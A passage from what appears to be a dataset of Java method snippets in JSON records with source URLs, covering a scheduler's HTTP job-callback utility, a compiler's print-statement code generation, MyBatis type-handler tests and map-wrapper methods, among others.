isThereJobCallbackProperty(final Props props,\n      final JobCallbackStatusEnum status) {\n\n    if (props == null || status == null) {\n      throw new NullPointerException(\"One of the argument is null\");\n    }\n\n    final String jobCallBackUrl = firstJobcallbackPropertyMap.get(status);\n    return props.containsKey(jobCallBackUrl);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31031, "method_name": "isThereJobCallbackProperty", "class_name": "JobCallbackUtil", "params": ["Props", "JobCallbackStatusEnum"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean isThereJobCallbackProperty(final Props props,\n      final JobCallbackStatusEnum... jobStatuses) {\n\n    if (props == null || jobStatuses == null) {\n      throw new NullPointerException(\"One of the argument is null\");\n    }\n\n    for (final JobCallbackStatusEnum jobStatus : jobStatuses) {\n      if (JobCallbackUtil.isThereJobCallbackProperty(props, jobStatus)) {\n        return true;\n      }\n    }\n    return false;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31032, "method_name": "parseJobCallbackProperties", "class_name": "JobCallbackUtil", "params": ["Props", "JobCallbackStatusEnum", "Map<String,String>", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<HttpRequestBase>", "snippet": "  public static List<HttpRequestBase> parseJobCallbackProperties(final Props props,\n      final JobCallbackStatusEnum status, final Map<String, String> contextInfo,\n      final int maxNumCallback) {\n\n    return parseJobCallbackProperties(props, status, contextInfo,\n        maxNumCallback, logger);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31033, "method_name": "parseJobCallbackProperties", "class_name": "JobCallbackUtil", "params": ["Props", "JobCallbackStatusEnum", "Map<String,String>", "int", "Logger"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<HttpRequestBase>", "snippet": "  public static List<HttpRequestBase> parseJobCallbackProperties(final Props props,\n      final JobCallbackStatusEnum status, final Map<String, String> contextInfo,\n      final int maxNumCallback, final Logger privateLogger) {\n    String callbackUrl = null;\n\n    if (!isThereJobCallbackProperty(props, status)) {\n      // short circuit\n      return Collections.emptyList();\n    }\n\n    final List<HttpRequestBase> result = new ArrayList<>();\n\n    // replace property templates with status\n    final String jobCallBackUrlKey =\n        replaceStatusToken(JOB_CALLBACK_URL_TEMPLATE, status);\n\n    final String requestMethod =\n        replaceStatusToken(JOB_CALLBACK_REQUEST_METHOD_TEMPLATE, status);\n\n    final String httpBodyKey = replaceStatusToken(JOB_CALLBACK_BODY_TEMPLATE, status);\n\n    final String headersKey =\n        replaceStatusToken(JOB_CALLBACK_REQUEST_HEADERS_TEMPLATE, status);\n\n    for (int sequence = 1; sequence <= maxNumCallback; sequence++) {\n      HttpRequestBase httpRequest = null;\n      final String sequenceStr = Integer.toString(sequence);\n      // callback url\n      final String callbackUrlKey =\n          jobCallBackUrlKey.replace(SEQUENCE_TOKEN, sequenceStr);\n\n      callbackUrl = props.get(callbackUrlKey);\n      if (callbackUrl == null || callbackUrl.length() == 0) {\n        // no more needs to done\n        break;\n      } else {\n        final String callbackUrlWithTokenReplaced =\n            replaceTokens(callbackUrl, contextInfo, true);\n\n        final String requestMethodKey =\n            requestMethod.replace(SEQUENCE_TOKEN, sequenceStr);\n\n        final String method = props.getString(requestMethodKey, HTTP_GET);\n\n        if (HTTP_POST.equals(method)) {\n          final String postBodyKey = httpBodyKey.replace(SEQUENCE_TOKEN, sequenceStr);\n          final String httpBodyValue = props.get(postBodyKey);\n          if (httpBodyValue == null) {\n            // missing body for POST, not good\n            // update the wiki about skipping callback url if body is missing\n            privateLogger.warn(\"Missing value for key: \" + postBodyKey\n                + \" skipping job callback '\" + callbackUrl + \" for job \"\n                + contextInfo.get(CONTEXT_JOB_TOKEN));\n          } else {\n            // put together an URL\n            final HttpPost httpPost = new HttpPost(callbackUrlWithTokenReplaced);\n            final String postActualBody =\n                replaceTokens(httpBodyValue, contextInfo, false);\n            privateLogger.info(\"postActualBody: \" + postActualBody);\n            httpPost.setEntity(createStringEntity(postActualBody));\n            httpRequest = httpPost;\n          }\n        } else if (HTTP_GET.equals(method)) {\n          // GET\n          httpRequest = new HttpGet(callbackUrlWithTokenReplaced);\n        } else {\n          privateLogger.warn(\"Unsupported request method: \" + method\n              + \". Only POST and GET are supported\");\n        }\n\n        final String headersKeyPerSequence =\n            headersKey.replace(SEQUENCE_TOKEN, sequenceStr);\n        final String headersValue = props.get(headersKeyPerSequence);\n        privateLogger.info(\"headers: \" + headersValue);\n        final Header[] headers = parseHttpHeaders(headersValue);\n        if (headers != null) {\n          httpRequest.setHeaders(headers);\n          privateLogger.info(\"# of headers found: \" + headers.length);\n        }\n        result.add(httpRequest);\n      }\n    }\n    return result;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31034, "method_name": "parseHttpHeaders", "class_name": "JobCallbackUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Header", "snippet": "  public static Header[] parseHttpHeaders(final String headers) {\n    if (headers == null || headers.length() == 0) {\n      return null;\n    }\n\n    final String[] headerArray = headers.split(HEADER_ELEMENT_DELIMITER);\n    final List<Header> headerList = new ArrayList<>(headerArray.length);\n    for (int i = 0; i < headerArray.length; i++) {\n      final String headerPair = headerArray[i];\n      final int index = headerPair.indexOf(HEADER_NAME_VALUE_DELIMITER);\n      if (index != -1) {\n        headerList.add(new BasicHeader(headerPair.substring(0, index),\n            headerPair.substring(index + 1)));\n      }\n\n    }\n    return headerList.toArray(new BasicHeader[0]);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31035, "method_name": "replaceStatusToken", "class_name": "JobCallbackUtil", "params": ["String", "JobCallbackStatusEnum"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String replaceStatusToken(final String template,\n      final JobCallbackStatusEnum status) {\n    return template.replaceFirst(STATUS_TOKEN, status.name().toLowerCase());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31036, "method_name": "createStringEntity", "class_name": "JobCallbackUtil", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "StringEntity", "snippet": "  private static StringEntity createStringEntity(final String str) {\n    try {\n      return new StringEntity(str);\n    } catch (final UnsupportedEncodingException e) {\n      throw new RuntimeException(\"Encoding not supported\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31037, "method_name": "buildJobContextInfoMap", "class_name": "JobCallbackUtil", "params": ["Event", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Map<String,String>", "snippet": "  public static Map<String, String> buildJobContextInfoMap(final Event event,\n      final String server) {\n\n    if (event.getRunner() instanceof JobRunner) {\n      final JobRunner jobRunner = (JobRunner) event.getRunner();\n      final ExecutableNode node = jobRunner.getNode();\n      final EventData eventData = event.getData();\n      final String projectName = node.getParentFlow().getProjectName();\n      final String flowName = node.getParentFlow().getFlowId();\n      final String executionId =\n          String.valueOf(node.getParentFlow().getExecutionId());\n      final String jobId = node.getId();\n\n      final Map<String, String> result = new HashMap<>();\n      result.put(CONTEXT_SERVER_TOKEN, server);\n      result.put(CONTEXT_PROJECT_TOKEN, projectName);\n      result.put(CONTEXT_FLOW_TOKEN, flowName);\n      result.put(CONTEXT_EXECUTION_ID_TOKEN, executionId);\n      result.put(CONTEXT_JOB_TOKEN, jobId);\n      result.put(CONTEXT_JOB_STATUS_TOKEN, eventData.getStatus().name().toLowerCase());\n\n      /*\n       * if (node.getStatus() == Status.SUCCEEDED || node.getStatus() ==\n       * Status.FAILED) { result.put(JOB_STATUS_TOKEN,\n       * node.getStatus().name().toLowerCase()); } else if (node.getStatus() ==\n       * Status.PREPARING) { result.put(JOB_STATUS_TOKEN, \"started\"); }\n       */\n\n      return result;\n\n    } else {\n      throw new IllegalArgumentException(\"Provided event is not a job event\");\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31038, "method_name": "replaceTokens", "class_name": "JobCallbackUtil", "params": ["String", "Map<String,String>", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String replaceTokens(final String value,\n      final Map<String, String> contextInfo, final boolean withEncoding) {\n\n    String result = value;\n    String tokenValue =\n        encodeQueryParam(contextInfo.get(CONTEXT_SERVER_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_SERVER_TOKEN), tokenValue);\n\n    tokenValue = encodeQueryParam(contextInfo.get(CONTEXT_PROJECT_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_PROJECT_TOKEN), tokenValue);\n\n    tokenValue = encodeQueryParam(contextInfo.get(CONTEXT_FLOW_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_FLOW_TOKEN), tokenValue);\n\n    tokenValue = encodeQueryParam(contextInfo.get(CONTEXT_JOB_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_JOB_TOKEN), tokenValue);\n\n    tokenValue =\n        encodeQueryParam(contextInfo.get(CONTEXT_EXECUTION_ID_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_EXECUTION_ID_TOKEN), tokenValue);\n\n    tokenValue =\n        encodeQueryParam(contextInfo.get(CONTEXT_JOB_STATUS_TOKEN), withEncoding);\n\n    result = result.replaceFirst(Pattern.quote(CONTEXT_JOB_STATUS_TOKEN), tokenValue);\n\n    return result;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31039, "method_name": "encodeQueryParam", "class_name": "JobCallbackUtil", "params": ["String", "boolean"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String encodeQueryParam(final String str, final boolean withEncoding) {\n    if (!withEncoding) {\n      return str;\n    }\n    try {\n      return URLEncoder.encode(str, \"UTF-8\");\n    } catch (final UnsupportedEncodingException e) {\n      throw new IllegalArgumentException(\n          \"Encountered problem during encoding:\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31040, "method_name": "main", "class_name": "Scanner2", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws IOException {\n\t\tint i, length, max;\n\t\tint[] vector;\n\t\tString str, path;\n\t\tBufferedReader br;\n\n\t\t// Input\n\t\tpath=\"hits_reshuffled.txt\";\n\n\t\t// Finding the maximum value\n\t\tbr = new BufferedReader(new FileReader(path),1000);\n\t\tmax=0;\n\t\tstr=br.readLine();  // Skipping the first line\n\t\tstr=br.readLine();\n\t\twhile (str!=null) {\n\t\t\ttry {length=Integer.parseInt(str); }\n\t\t\tcatch(NumberFormatException e) { break; }\n\t\t\tif (length>max) max=length;\n\t\t\tstr=br.readLine();\n\t\t}\n\t\tbr.close();\n\t\tvector = new int[max+1];\n\n\t\t// Building the histogram\n\t\tbr = new BufferedReader(new FileReader(path),1000);\n\t\tstr=br.readLine();  // Skipping the first line\n\t\tstr=br.readLine();\n\t\twhile (str!=null) {\n\t\t\ttry {length=Integer.parseInt(str); }\n\t\t\tcatch(NumberFormatException e) { break; }\n\t\t\tvector[length]++;\n\t\t\tstr=br.readLine();\n\t\t}\n\t\tbr.close();\n\n\t\t// Reporting\n\t\tfor (i=0; i<=max; i++) System.out.println(vector[i]);\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/Scanner2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31041, "method_name": "generateCode", "class_name": "StmPRINT", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result = \"\";\n\t\tresult += super.generateCode();\n\t\tswitch (expr.getType().getTypeCode()) {\n\t\tcase FLOAT:\n\t\t\tresult += tab() + \"printf(\\\"%f\\\", \";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase INTEGER:\n\t\tcase ENUM:\n\t\t\tresult += tab() + \"printf(\\\"%d\\\", \";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase BOOLEAN:\n\t\t\tresult += tab() + \"printf(\\\"%s\\\", (\";\n\t\t\tresult += expr.generateCode() + \" == 1) ? \\\"true\\\" : \\\"false\\\");\" + NL;\n\t\t\tbreak;\n\t\tcase STRING:\n\t\t\tresult += tab() + \"printf(\\\"%s\\\", \";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase POINTER:\n\t\t\tresult += tab() + \"printf(\\\"%lu\\\", (unsigned long)\";\n\t\t\tif (expr.isPOINTER())\n\t\t\t\tresult += ((ExprPOINTER)expr).getPointerCode() + \");\" + NL;\n\t\t\telse\n\t\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase ARRAY:\n\t\t\tresult += tab() + \"printf(\\\"ARRAY_%lx\\\", (unsigned long)\";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase STRUCT:\n\t\t\tresult += tab() + \"printf(\\\"STRUCT_%lx\\\", (unsigned long)\";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthrow new CodeException(\"print\");\n\t\t}\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmPRINT.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 31042, "method_name": "checkType", "class_name": "StmPRINT", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\texpr.checkType();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmPRINT.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 31043, "method_name": "toString", "class_name": "StmPRINT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"print \" + expr;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmPRINT.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 31044, "method_name": "getSpriteForSide", "class_name": "VerticalCTMSpriteProvider", "params": ["Direction", "BlockRenderView", "BlockState", "BlockPos", "Random"], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "\tpublic Sprite getSpriteForSide(Direction side, BlockRenderView view, BlockState state, BlockPos pos, Random random) {\n\t\tboolean down = testDown(view, side, pos, state);\n\t\tboolean up = testUp(view, side, pos, state);\n\t\tif(down && up) {\n\t\t\treturn connects[1];\n\t\t} else if(down && !up) {\n\t\t\treturn connects[2];\n\t\t} else if(!down && up) {\n\t\t\treturn connects[0];\n\t\t} else {\n\t\t\treturn connects[3];\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/sprite/VerticalCTMSpriteProvider.java", "stars": "3", "class_props": {"extends": "ConnectingSpriteProvider", "implements": null, "modifiers": ["public"]}}, {"id": 31045, "method_name": "shouldSetParameter", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {\n    TYPE_HANDLER.setParameter(ps, 1, 100f, null);\n    verify(ps).setFloat(1, 100f);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31046, "method_name": "shouldGetResultFromResultSetByName", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {\n    when(rs.getFloat(\"column\")).thenReturn(100f);\n    assertEquals(Float.valueOf(100f), TYPE_HANDLER.getResult(rs, \"column\"));\n\n    when(rs.getFloat(\"column\")).thenReturn(0f);\n    assertEquals(Float.valueOf(0f), TYPE_HANDLER.getResult(rs, \"column\"));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31047, "method_name": "shouldGetResultNullFromResultSetByName", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {\n    when(rs.getFloat(\"column\")).thenReturn(0f);\n    when(rs.wasNull()).thenReturn(true);\n    assertNull(TYPE_HANDLER.getResult(rs, \"column\"));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31048, "method_name": "shouldGetResultFromResultSetByPosition", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {\n    when(rs.getFloat(1)).thenReturn(100f);\n    assertEquals(Float.valueOf(100f), TYPE_HANDLER.getResult(rs, 1));\n\n    when(rs.getFloat(1)).thenReturn(0f);\n    assertEquals(Float.valueOf(0f), TYPE_HANDLER.getResult(rs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31049, "method_name": "shouldGetResultNullFromResultSetByPosition", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {\n    when(rs.getFloat(1)).thenReturn(0f);\n    when(rs.wasNull()).thenReturn(true);\n    assertNull(TYPE_HANDLER.getResult(rs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31050, "method_name": "shouldGetResultFromCallableStatement", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {\n    when(cs.getFloat(1)).thenReturn(100f);\n    assertEquals(Float.valueOf(100f), TYPE_HANDLER.getResult(cs, 1));\n\n    when(cs.getFloat(1)).thenReturn(0f);\n    assertEquals(Float.valueOf(0f), TYPE_HANDLER.getResult(cs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31051, "method_name": "shouldGetResultNullFromCallableStatement", "class_name": "FloatTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {\n    when(cs.getFloat(1)).thenReturn(0f);\n    when(cs.wasNull()).thenReturn(true);\n    assertNull(TYPE_HANDLER.getResult(cs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/FloatTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31052, "method_name": "get", "class_name": "MapWrapper", "params": ["PropertyTokenizer"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object get(PropertyTokenizer prop) {\n    if (prop.getIndex() != null) {\n      Object collection = resolveCollection(prop, map);\n      return getCollectionValue(prop, collection);\n    } else {\n      return map.get(prop.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31053, "method_name": "set", "class_name": "MapWrapper", "params": ["PropertyTokenizer", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void set(PropertyTokenizer prop, Object value) {\n    if (prop.getIndex() != null) {\n      Object collection = resolveCollection(prop, map);\n      setCollectionValue(prop, collection, value);\n    } else {\n      map.put(prop.getName(), value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31054, "method_name": "findProperty", "class_name": "MapWrapper", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String findProperty(String name, boolean useCamelCaseMapping) {\n    return name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31055, "method_name": "getGetterNames", "class_name": "MapWrapper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getGetterNames() {\n    return map.keySet().toArray(new String[map.keySet().size()]);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31056, "method_name": "getSetterNames", "class_name": "MapWrapper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getSetterNames() {\n    return map.keySet().toArray(new String[map.keySet().size()]);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31057, "method_name": "getSetterType", "class_name": "MapWrapper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getSetterType(String name) {\n    PropertyTokenizer prop = new PropertyTokenizer(name);\n    if (prop.hasNext()) {\n      MetaObject metaValue = metaObject.metaObjectForProperty(prop.getIndexedName());\n      if (metaValue == SystemMetaObject.NULL_META_OBJECT) {\n        return Object.class;\n      } else {\n        return metaValue.getSetterType(prop.getChildren());\n      }\n    } else {\n      if (map.get(name) != null) {\n        return map.get(name).getClass();\n      } else {\n        return Object.class;\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31058, "method_name": "getGetterType", "class_name": "MapWrapper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getGetterType(String name) {\n    PropertyTokenizer prop = new PropertyTokenizer(name);\n    if (prop.hasNext()) {\n      MetaObject metaValue = metaObject.metaObjectForProperty(prop.getIndexedName());\n      if (metaValue == SystemMetaObject.NULL_META_OBJECT) {\n        return Object.class;\n      } else {\n        return metaValue.getGetterType(prop.getChildren());\n      }\n    } else {\n      if (map.get(name) != null) {\n        return map.get(name).getClass();\n      } else {\n        return Object.class;\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31059, "method_name": "hasSetter", "class_name": "MapWrapper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasSetter(String name) {\n    return true;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31060, "method_name": "hasGetter", "class_name": "MapWrapper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasGetter(String name) {\n    PropertyTokenizer prop = new PropertyTokenizer(name);\n    if (prop.hasNext()) {\n      if (map.containsKey(prop.getIndexedName())) {\n        MetaObject metaValue = metaObject.metaObjectForProperty(prop.getIndexedName());\n        if (metaValue == SystemMetaObject.NULL_META_OBJECT) {\n          return true;\n        } else {\n          return metaValue.hasGetter(prop.getChildren());\n        }\n      } else {\n        return false;\n      }\n    } else {\n      return map.containsKey(prop.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31061, "method_name": "instantiatePropertyValue", "class_name": "MapWrapper", "params": ["String", "PropertyTokenizer", "ObjectFactory"], "throws": null, "modifiers": ["public"], "return_type": "MetaObject", "snippet": "  public MetaObject instantiatePropertyValue(String name, PropertyTokenizer prop, ObjectFactory objectFactory) {\n    HashMap<String, Object> map = new HashMap<>();\n    set(prop, map);\n    return MetaObject.forObject(map, metaObject.getObjectFactory(), metaObject.getObjectWrapperFactory(), metaObject.getReflectorFactory());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31062, "method_name": "isCollection", "class_name": "MapWrapper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isCollection() {\n    return false;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31063, "method_name": "add", "class_name": "MapWrapper", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void add(Object element) {\n    throw new UnsupportedOperationException();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31064, "method_name": "addAll", "class_name": "MapWrapper", "params": ["List<E>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <E> void addAll(List<E> element) {\n    throw new UnsupportedOperationException();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/wrapper/MapWrapper.java", "stars": "15", "class_props": {"extends": "BaseWrapper", "implements": null, "modifiers": ["public"]}}, {"id": 31065, "method_name": "with", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "KeyboardWatcher", "snippet": "    public static KeyboardWatcher with(Activity activity) {\n        return new KeyboardWatcher(activity);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", 